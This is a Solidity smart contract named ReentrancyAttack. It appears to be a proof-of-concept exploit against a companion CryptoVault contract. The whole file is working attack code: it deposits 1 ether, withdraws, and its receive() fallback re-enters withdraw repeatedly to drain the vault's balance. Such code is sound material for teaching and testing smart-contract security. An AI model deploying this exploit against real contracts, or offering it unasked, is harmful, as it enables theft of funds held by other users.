// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./CryptoVault.sol";

contract ReentrancyAttack {

    CryptoVault public vault;
    constructor(address _vaultAddress) public {
        vault = CryptoVault(payable(_vaultAddress));
    }

    // Fallback function to receive Ether and re-call withdraw.
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
